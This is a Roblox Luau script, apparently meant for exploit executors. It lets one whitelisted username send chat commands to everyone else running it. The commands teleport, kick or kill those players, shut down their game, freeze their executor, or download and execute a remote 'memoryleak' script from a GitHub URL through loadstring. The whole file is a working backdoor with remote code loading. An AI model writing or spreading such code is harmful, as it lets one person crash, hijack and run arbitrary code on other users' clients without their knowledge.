local whitelist = {
    ["just12281oom"] = true
}

local text = "commands ~ lagback, leave, kick, executorkill, memoryleak, kill"
local colors = {
    Color3.fromRGB(205, 160, 255),
    Color3.fromRGB(145, 160, 200)
}

local commands = ""
for i = 1, #text do
    local t = i / #text
    local color = Color3.new(
        colors[1].R + (colors[2].R - colors[1].R) * t,
        colors[1].G + (colors[2].G - colors[1].G) * t,
        colors[1].B + (colors[2].B - colors[1].B) * t
    )
    commands = commands .. string.format("<font color=\"rgb(%d, %d, %d)\"><b>%s</b></font>", color.R * 255, color.G * 255, color.B * 255, text:sub(i, i))
end

local commandsFunc = {
    lagback = function(player)
        game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(CFrame.new(100, 100, 100))
    end,
    leave = function(player)
        game:Shutdown()
    end,
    kick = function(player)
        game.Players.LocalPlayer:Kick("You have been kicked!")
    end,
    executorkill = function(player)
        task.spawn(setfpscap, 9e9)
    end,
    memoryleak = function(player)
        local success, error = pcall(function()
            loadstring(game:HttpGet('https://raw.githubusercontent.com/e266cfd65ad46a67fc54b0efd38e40dd/scripthub/main/memoryleak'))()
        end)
        if not success then
            print("Error loading memoryleak script:", error)
        end
    end,
    kill = function(player)
        player.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
    end
}

local player = game.Players.LocalPlayer

if whitelist[player.Name] then
    game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
        Text = commands,
    })
end

local function onChatMessage(player, message)
    if not whitelist[player.Name] then
        return
    end
    
    if commandsFunc[message] then
        commandsFunc[message](player)
    end
end

local function onPlayerChatted(player)
    player.Chatted:Connect(function(message)
        onChatMessage(player, message)
    end)
end

game.Players.PlayerAdded:Connect(onPlayerChatted)

for _, player in ipairs(game.Players:GetPlayers()) do
    onPlayerChatted(player)
end
